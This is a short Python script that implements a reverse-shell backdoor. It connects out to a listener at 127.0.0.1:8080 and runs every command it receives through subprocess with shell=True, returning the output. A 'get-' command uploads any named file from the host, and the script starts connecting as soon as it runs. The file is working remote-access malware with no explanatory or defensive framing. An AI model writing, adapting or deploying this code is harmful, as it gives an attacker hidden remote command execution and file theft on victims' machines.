import socket
import subprocess
import os

def transfer(s, path):
    
    if os.path.exists(path):
        f = open(path, 'rb')
        packet = f.read(1024)
        while len(packet) > 0:
            s.send(packet)
            packet = f.read(1024)
        s.send('DONE'.encode())
    
    else:
        s.send('File not found'.encode())

def connectback():
    s = socket.socket()
    s.connect(("127.0.0.1", 8080))

    while True:
        command = s.recv(1024)

        if 'exit' in command.decode():
            s.close()
            break
        
        elif 'get' in command.decode():
            grab, path = command.decode().split("-")
            try:
                transfer(s, path)
            except:
                pass
        else:
            CMD = subprocess.Popen(command.decode(), shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE,stdin=subprocess.PIPE)
            s.send(CMD.stderr.read())
            s.send(CMD.stdout.read())
def main():
    connectback()
main()
